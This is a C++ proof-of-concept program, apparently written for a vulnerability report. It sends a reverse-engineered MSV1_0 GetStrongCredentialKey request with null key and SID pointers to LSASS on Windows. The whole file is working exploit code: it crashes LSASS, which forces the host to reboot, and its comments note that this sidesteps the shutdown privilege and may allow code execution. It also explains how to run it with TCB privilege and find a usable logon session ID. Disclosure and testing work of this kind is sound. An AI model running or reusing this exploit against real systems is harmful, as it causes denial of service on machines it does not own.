#include <Windows.h>

#define SECURITY_WIN32
#include <codecvt>
#include <iomanip>
#include <iostream>
#include <locale>
#include <ntsecapi.h>
#include <security.h>
#include <string>
#include <vector>
#include <winerror.h>

#pragma comment(lib, "Secur32.lib")

enum class PROTOCOL_MESSAGE_TYPE : ULONG {
	Lm20ChallengeRequest = 0,
	Lm20GetChallengeResponse,
	EnumerateUsers,
	GetUserInfo,
	ReLogonUsers,
	ChangePassword,
	ChangeCachedPassword,
	GenericPassthrough,
	CacheLogon,
	SubAuth,
	DeriveCredential,
	CacheLookup,
	SetProcessOption,
	ConfigLocalAliases,
	ClearCachedCredentials,
	LookupToken,
	ValidateAuth,
	CacheLookupEx,
	GetCredentialKey,
	SetThreadOption,
	DecryptDpapiMasterKey,
	GetStrongCredentialKey,
	TransferCred,
	ProvisionTbal,
	DeleteTbalSecrets
};

// Reverse engineered
typedef struct _GET_STRONG_CREDENTIAL_KEY_REQUEST {
	PROTOCOL_MESSAGE_TYPE MessageType{ PROTOCOL_MESSAGE_TYPE::GetStrongCredentialKey };
	DWORD Version; // Specifies the mode of operation
	// Used in version 0 requests
	DWORD Reserved[8]; // Ignored
	LUID LogonId;
	// Used in version 1 requests
	MSV1_0_CREDENTIAL_KEY_TYPE KeyType; // Must be DomainUserCredKey or LocalUserCredKey
	DWORD KeyLength;
	PWSTR Key; // Treated as a cleartext password for DomainUserCredKey, otherwise an NT OWF hash
	DWORD SidLength;
	PWSTR Sid; // Used to lookup the account type to 
	DWORD IsProtectedUser; // Determined from lsasrv!LsapGetStrongCredentialKeyFromMSV
} GET_STRONG_CREDENTIAL_KEY_REQUEST, * PGET_STRONG_CREDENTIAL_KEY_REQUEST;

// Reverse engineered
typedef struct _GET_CREDENTIAL_KEY_RESPONSE {
	PROTOCOL_MESSAGE_TYPE MessageType;
	UCHAR Reserved[16];
	DWORD CredSize; // <- 0x28
	UCHAR ShaPassword[MSV1_0_SHA_PASSWORD_LENGTH];
	UCHAR Key2[20];
	// 8 bytes of pad
} GET_CREDENTIAL_KEY_RESPONSE, * PGET_CREDENTIAL_KEY_RESPONSE;

using GET_STRONG_CREDENTIAL_KEY_RESPONSE = GET_CREDENTIAL_KEY_RESPONSE;
using PGET_STRONG_CREDENTIAL_KEY_RESPONSE = PGET_CREDENTIAL_KEY_RESPONSE;

int wmain(int argc, wchar_t** argv) {
	if (argc == 2) {
		// Get the user supplied luid
		auto luid{ std::stoul(argv[1], nullptr, 16) };
		HANDLE lsaHandle;
		if (SUCCEEDED(LsaConnectUntrusted(&lsaHandle))) {
			std::vector<char> buffer{ MSV1_0_PACKAGE_NAME, MSV1_0_PACKAGE_NAME + sizeof(MSV1_0_PACKAGE_NAME) };
			LSA_STRING apName = { buffer.size() - 1, buffer.size(), buffer.data() };
			ULONG apId;
			if (SUCCEEDED(LsaLookupAuthenticationPackage(lsaHandle, &apName, &apId))) {
				// The GET_STRONG_CREDENTIAL_KEY_REQUEST structure was reverse engineered
				// It will be different from internal Microsoft sources but should be
				// close enough to verify the issue
				GET_STRONG_CREDENTIAL_KEY_REQUEST request;
				request.Version = 1;
				std::memset(request.Reserved, '\0', sizeof(request.Reserved));
				// This must be a valid for a logon session managed by MSV1_0
				request.LogonId.LowPart = luid;
				request.LogonId.HighPart = 0;
				request.KeyType = DomainUserCredKey;
				// Specify that data is being supplied but set both data pointers to 0
				// Any arbitrary pointer can be supplied and will not be checked by LSASS
				// 0 is supplied to demonstrate a null-pointer dereference that will crash LSASS
				// and force the host to reboot because a critical process was terminated
				//
				// Users may immediately abuse the issue to bypass not having SeShutdownPrivilege.
				// Gaining arbitrary code execution may be possible but has not been proven.
				request.KeyLength = 100;
				request.Key = 0;
				request.SidLength = 100;
				request.Sid = 0;
				request.IsProtectedUser = 0;

				// Caution. This will send the request which will crash LSASS and your machine will be restarted.
				PGET_STRONG_CREDENTIAL_KEY_RESPONSE response;
				ULONG responseSize;
				NTSTATUS status;
				std::cout << "MSV1_0 -> GetStrongCredentialKey Output" << std::endl;
				if (SUCCEEDED(LsaCallAuthenticationPackage(lsaHandle, apId, &request, sizeof(request), reinterpret_cast<PVOID*>(&response), &responseSize, &status)) && SUCCEEDED(status)) {
					// If the request was recieve the output will never be received because LSASS has crashed
					// 
					// If the LSASS has not crashed than your request was not accepted by LSASS. That is
					// likely due to not running the POC as a process with the TCB privilege. Please rerun
					// the POC as a process with TCB privilege to verify. The easiest way to test this is to
					// right click a System process (ex. winlogon) in a program such as "process hacker" or
					// "system informer", choose "Miscellanious -> Run as this user..." then run the POC.
					LsaFreeReturnBuffer(response);
				}
			}
			LsaDeregisterLogonProcess(lsaHandle);
		}
	}
	else {
		std::wcout << argv[0] << L" <luid>" << std::endl << std::endl;
		std::cout << "A valid luid for a logon session managed by MSV1_0 is required." << std::endl;
		std::cout << "To find a usable LUID:" << std::endl;
		std::cout << "1. Run logonsessions64.exe from the System Internals Suite as admin" << std::endl;
		std::cout << "2. Identify an Interactive, NTLM session for a normal user account (any will work)" << std::endl;
		std::cout << "3. Use the logon session ID value as the LUID (ex. if the value is 00000000:00AABBCC, use 0xAABBCC)" << std::endl;
	}
}
